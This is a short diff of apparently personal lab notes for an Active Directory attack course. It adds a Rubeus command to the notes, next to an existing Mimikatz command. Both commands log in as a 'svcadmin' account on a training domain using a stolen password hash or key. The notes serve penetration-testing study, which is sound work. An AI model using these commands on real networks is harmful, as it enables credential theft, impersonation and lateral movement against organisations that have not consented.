@@ -441,6 +441,10 @@ Open a session on the dc
 ```powershell
 Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
 ```
+or using Rubeus
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 Launch Invishell e establish the session
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
